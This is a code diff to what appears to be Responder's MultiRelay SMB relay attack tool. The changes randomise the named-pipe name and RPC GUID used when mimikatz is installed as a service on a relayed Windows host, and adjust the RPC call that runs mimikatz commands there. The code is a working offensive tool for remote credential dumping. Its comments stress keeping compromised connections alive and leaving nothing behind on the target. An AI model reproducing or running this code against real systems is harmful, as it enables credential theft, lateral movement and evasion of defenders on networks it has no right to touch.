@@ -19,9 +19,11 @@ import sys
 import random
 import time
 import os
+import binascii
 import re
 import datetime
 import threading
+import uuid
 from RelayMultiPackets import *
 from odict import OrderedDict
 from base64 import b64decode, b64encode
@@ -371,6 +373,16 @@ def GenerateServiceName():
 def GenerateServiceID():
     return''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(16)])
 
+def GenerateNamedPipeName():
+    return''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for i in range(random.randint(3, 30))])
+
+def Generateuuid():
+    RandomStr     = binascii.b2a_hex(os.urandom(16))
+    x             = uuid.UUID(bytes_le=RandomStr.decode('hex'))
+    DisplayGUID   = uuid.UUID(RandomStr)
+    DisplayGUIDle = x.bytes
+    return str(DisplayGUID), str(DisplayGUIDle)
+
 ###
 #SMBRelay grab
 ###
@@ -542,7 +554,7 @@ def MimiKatzRPC(Command, f, host, data, s):
             head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x06\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
             w = SMBDCEMimiKatzRPCCommand(CMD=Command)
             w.calculate()
-            x = SMBDCEPacketData(Data=w, Opnum="\x00\x00")
+            x = SMBDCEPacketData(Data=w, Opnum="\x03\x00")
             x.calculate()
             t = SMBDCERPCWriteData(FID=f,Data=x)
             t.calculate()
@@ -1925,10 +1937,12 @@ def InstallMimiKatz(data, s, clientIP, Username, Domain, Command, Logs, Host, Fi
     global MimiKatzSVCID
     global MimiKatzSVCName
     try:
+       DisplayGUID, DisplayGUIDle = Generateuuid()
+       NamedPipe        = GenerateNamedPipeName()
        RandomFName      = GenerateRandomFileName()
        WinTmpPath       = "%windir%\\Temp\\"+RandomFName+".txt"
        #Install mimikatz as a service.
-       Command          = "c:\\Windows\\Temp\\"+FileName+" \"rpc::server /protseq:ncacn_np /endpoint:\pipe\wtf /noreg\" service::me exit"
+       Command          = "c:\\Windows\\Temp\\"+FileName+" \"rpc::server /protseq:ncacn_np /endpoint:\pipe\\"+NamedPipe+" /guid:{"+DisplayGUID+"} /noreg\" service::me exit"
        MimiKatzSVCName  = GenerateServiceName()
        MimiKatzSVCID    = GenerateServiceID()
 
@@ -1940,7 +1954,7 @@ def InstallMimiKatz(data, s, clientIP, Username, Domain, Command, Logs, Host, Fi
        Logs.info('Command executed:')
        Logs.info(clientIP+","+Username+','+Command)      
 
-       return data
+       return data, DisplayGUIDle, NamedPipe
 
     except:
        #Don't loose this connection because something went wrong, it's a good one. Commands might fail, while hashdump works.
@@ -1949,13 +1963,14 @@ def InstallMimiKatz(data, s, clientIP, Username, Domain, Command, Logs, Host, Fi
 
 def RunMimiCmd(data, s, clientIP, Username, Domain, Command, Logs, Host, FileName):
     try:
-       InstallMimiKatz(data, s, clientIP, Username, Domain, Command, Logs, Host, FileName)
-       data,s        = SMBOpenPipe(Host, data, s)
+       data,guid,namedpipe    = InstallMimiKatz(data, s, clientIP, Username, Domain, Command, Logs, Host, FileName)
+       data,s                 = SMBOpenPipe(Host, data, s)
        ##Wait for the pipe to come up..
        time.sleep(1)
-       data,s,f      = BindCall("\xe9\x11\xfc\x17\x58\xc2\x8d\x4b\x8d\x07\x2f\x41\x25\x15\x62\x44", "\x01\x00", "\\wtf", data, s)
-       data,s,f      = MimiKatzRPC(Command, f, Host, data, s)
-       data,s        = SMBDCERPCCloseFID(f, data,s)
+
+       data,s,f               = BindCall(guid, "\x01\x00", "\\"+namedpipe, data, s)
+       data,s,f               = MimiKatzRPC(Command, f, Host, data, s)
+       data,s                 = SMBDCERPCCloseFID(f, data,s)
        #####
        #Kill the SVC now... Never know when the user will leave, so lets not leave anything on the target.
        data,s           = SMBOpenPipe(Host, data, s)
@@ -1972,7 +1987,7 @@ def RunMimiCmd(data, s, clientIP, Username, Domain, Command, Logs, Host, FileNam
        return ModifySMBRetCode(data)
     except:
        #Don't loose this connection because something went wrong, it's a good one. Commands might fail, while hashdump works.
-       print "[+] Something went wrong while calling mimikatz. Did you run install mimi before launching this command?"
+       print "[+] Something went wrong while calling mimikatz. Maybe it's a 32bits system? Try mimi32."
        return ModifySMBRetCode(data)
 
 ##########Pivot#############
